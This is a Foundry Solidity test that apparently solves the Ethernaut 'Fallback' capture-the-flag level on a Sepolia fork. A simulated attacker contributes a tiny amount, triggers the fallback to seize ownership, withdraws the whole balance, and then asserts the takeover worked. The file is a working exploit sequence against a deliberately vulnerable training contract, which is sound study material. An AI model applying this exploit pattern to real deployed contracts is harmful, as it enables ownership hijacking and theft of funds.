// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/01-Fallback/Fallback.sol";

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract TestFallback is Test{

    address private constant TARGET_ADDRESS = 0x4189a5D594E4e5547ad6bb804E2DFb3F59a688e4;
    IFallback target;
    address attacker;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = IFallback(TARGET_ADDRESS);
        attacker = makeAddr("attacker");
        deal(attacker, 2 wei);

        console.log("OWNER : ", target.owner());
        console.log("TestFallback : ", address(this));
        console.log("Attacker: ", attacker);
        console.log("Target: ", address(target));
        console.log("Initial Balance: ", address(target).balance);
    }

    function testFallback() public {
        // Arrange
        vm.startPrank(attacker);

        // Act
        target.contribute{value: 1 wei}();
        (bool success, ) = address(target).call{value: 1 wei}("");
        target.withdraw();

        vm.stopPrank();

        // Assert
        // 1. Clain ownership
        assertEq(target.owner() , attacker);
        
        // 2. Drain the contract
        assertEq(address(target).balance, 0);
    }
}
